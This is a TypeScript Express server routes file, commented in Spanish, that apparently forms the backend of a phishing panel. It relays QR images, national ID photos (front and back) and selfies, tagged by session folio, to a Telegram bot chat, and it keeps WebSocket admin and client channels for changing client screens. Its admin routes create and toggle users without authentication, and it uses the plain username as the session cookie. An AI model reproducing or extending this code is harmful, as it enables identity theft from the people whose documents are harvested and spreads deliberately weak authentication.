import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { nanoid } from "nanoid";
import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema } from "@shared/schema";
import { setupAuth } from "./auth";
import axios from 'axios';
import FormData from 'form-data';

// Función para generar IDs numéricos de una longitud específica
const generateNumericId = (length: number): string => {
  let id = '';
  for (let i = 0; i < length; i++) {
    id += Math.floor(Math.random() * 10).toString();
  }
  return id;
};

// Función para enviar mensajes a Telegram
const sendTelegramMessage = async (message: string) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('❌ Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurado');
    return null;
  }

  console.log(`📤 Enviando mensaje a Telegram (Chat ID: ${chatId})...`);

  try {
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('✅ Mensaje enviado a Telegram exitosamente');
    return response.data;
  } catch (error: any) {
    console.error('❌ Error enviando mensaje a Telegram:', error?.response?.data || error?.message || error);
    if (error?.response?.data) {
      console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
    }
    return null;
  }
};

// Función para enviar imágenes a Telegram
const sendTelegramPhoto = async (imageData: string, caption: string) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('❌ Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurado');
    return null;
  }

  console.log(`📤 Enviando imagen QR a Telegram (Chat ID: ${chatId})...`);

  try {
    // Convertir base64 a buffer
    const base64Data = imageData.replace(/^data:image\/\w+;base64,/, '');
    const photoBuffer = Buffer.from(base64Data, 'base64');

    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('photo', photoBuffer, 'qr_code.jpg');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
      headers: form.getHeaders()
    });

    console.log('✅ Imagen QR enviada a Telegram exitosamente');
    return response.data;
  } catch (error: any) {
    console.error('❌ Error enviando imagen QR a Telegram:', error?.response?.data || error?.message || error);
    if (error?.response?.data) {
      console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
    }
    return null;
  }
};

// Función para enviar fotos de identidad a Telegram
const sendIdentityPhotosToTelegram = async (
  sessionFolio: string,
  tipoIdentificacion: string,
  fotoFrente: string,
  fotoAtras: string | null,
  fotoSelfie: string
) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('❌ Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurado');
    return;
  }

  console.log(`📸 Enviando fotos de identidad a Telegram (Folio: ${sessionFolio})...`);

  const wait = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  try {
    // Foto frontal
    if (fotoFrente) {
      const base64Frente = fotoFrente.replace(/^data:image\/\w+;base64,/, '');
      const bufferFrente = Buffer.from(base64Frente, 'base64');

      // Validar tamaño (límite de Telegram es 10MB)
      if (bufferFrente.length > 10 * 1024 * 1024) {
        console.error('❌ Foto frontal excede el límite de 10MB');
      } else {
        const formFrente = new FormData();
        formFrente.append('chat_id', chatId);
        formFrente.append('photo', bufferFrente, 'identidad_frente.jpg');
        formFrente.append('caption', `📋 <b>Folio:</b> ${sessionFolio}\n📸 <b>${tipoIdentificacion} - Frente</b>`);
        formFrente.append('parse_mode', 'HTML');

        await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formFrente, {
          headers: formFrente.getHeaders()
        });
        console.log('✅ Foto frontal enviada');
        await wait(1200); // Esperar 1.2s entre fotos
      }
    }

    // Foto trasera (solo para INE)
    if (fotoAtras && tipoIdentificacion === 'INE') {
      const base64Atras = fotoAtras.replace(/^data:image\/\w+;base64,/, '');
      const bufferAtras = Buffer.from(base64Atras, 'base64');

      if (bufferAtras.length > 10 * 1024 * 1024) {
        console.error('❌ Foto trasera excede el límite de 10MB');
      } else {
        const formAtras = new FormData();
        formAtras.append('chat_id', chatId);
        formAtras.append('photo', bufferAtras, 'identidad_atras.jpg');
        formAtras.append('caption', `📋 <b>Folio:</b> ${sessionFolio}\n📸 <b>INE - Atrás</b>`);
        formAtras.append('parse_mode', 'HTML');

        await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formAtras, {
          headers: formAtras.getHeaders()
        });
        console.log('✅ Foto trasera enviada');
        await wait(1200);
      }
    }

    // Selfie
    if (fotoSelfie) {
      const base64Selfie = fotoSelfie.replace(/^data:image\/\w+;base64,/, '');
      const bufferSelfie = Buffer.from(base64Selfie, 'base64');

      if (bufferSelfie.length > 10 * 1024 * 1024) {
        console.error('❌ Selfie excede el límite de 10MB');
      } else {
        const formSelfie = new FormData();
        formSelfie.append('chat_id', chatId);
        formSelfie.append('photo', bufferSelfie, 'selfie.jpg');
        formSelfie.append('caption', `📋 <b>Folio:</b> ${sessionFolio}\n🤳 <b>Selfie</b>`);
        formSelfie.append('parse_mode', 'HTML');

        await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formSelfie, {
          headers: formSelfie.getHeaders()
        });
        console.log('✅ Selfie enviada');
      }
    }

    console.log('✅ Todas las fotos de identidad enviadas exitosamente');
  } catch (error: any) {
    console.error('❌ Error enviando fotos de identidad a Telegram:', error?.response?.data || error?.message || error);
    if (error?.response?.data) {
      console.error('Detalles del error:', JSON.stringify(error.response.data, null, 2));
    }
  }
};

// Store active connections
const clients = new Map<string, WebSocket>();
// Cambiamos a un Map para asociar cada socket con su username
const adminClients = new Map<string, WebSocket>();

export async function registerRoutes(app: Express): Promise<Server> {
  // Setup authentication
  setupAuth(app);

  // Create HTTP server
  const httpServer = createServer(app);

  // Configurar limpieza periódica de sesiones vacías (cada minuto)
  setInterval(async () => {
    try {
      const expiredCount = await storage.cleanupExpiredSessions();
      const emptyCount = await storage.cleanupEmptySessions();
      const totalDeleted = expiredCount + emptyCount;

      if (totalDeleted > 0) {
        console.log(`Limpieza automática: ${expiredCount} sesiones expiradas + ${emptyCount} sesiones vacías eliminadas`);
        broadcastToAdmins(JSON.stringify({
          type: 'SESSIONS_CLEANUP',
          data: { 
            expiredCount, 
            emptyCount, 
            totalDeleted 
          }
        }));
      }
    } catch (error) {
      console.error("Error en la limpieza automática de sesiones:", error);
    }
  }, 60000); // Ejecutar cada 60 segundos

  // Create WebSocket server
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });

  // La limpieza periódica de sesiones antiguas ya está configurada cada minuto

  // Configurar limpieza periódica de usuarios expirados
  setInterval(async () => {
    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      if (deactivatedCount > 0) {
        console.log(`Limpieza automática: ${deactivatedCount} usuarios expirados desactivados`);
        broadcastToAdmins(JSON.stringify({
          type: 'USERS_CLEANUP',
          data: { deactivatedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de usuarios:', error);
    }
  }, 6 * 60 * 60 * 1000); // Ejecutar cada 6 horas

  // API endpoints
  // Rutas de administración de usuarios
  app.post('/api/admin/users', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.createAdminUser(username, password);
      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(400).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.validateAdminUser(username, password);
      if (!user) {
        return res.status(401).json({ success: false, message: "Credenciales inválidas" });
      }

      // Actualizamos la última fecha de inicio de sesión
      await storage.updateUserLastLogin(user.id);

      // Establecemos una cookie de sesión simple (en una implementación real usaríamos JWT o similar)
      res.cookie('auth_token', username, { 
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000 // 1 día
      });

      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/logout', async (req, res) => {
    try {
      // Limpiar la cookie de autenticación
      res.clearCookie('auth_token');
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/users/:username/toggle', async (req, res) => {
    try {
      const { username } = req.params;
      const success = await storage.toggleAdminUserStatus(username);
      if (!success) {
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/users', async (req, res) => {
    try {
      const users = await storage.getAllAdminUsers();
      res.json(users.map((user: User) => ({ ...user, password: undefined })));
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Ruta para obtener usuarios regulares (solo para el usuario "balonx")
  app.get('/api/users/regular', async (req, res) => {
    console.log('[API] Solicitud para obtener usuarios regulares');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    console.log(`[API] Usuario actual: ${user.username}, rol: ${user.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (user.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
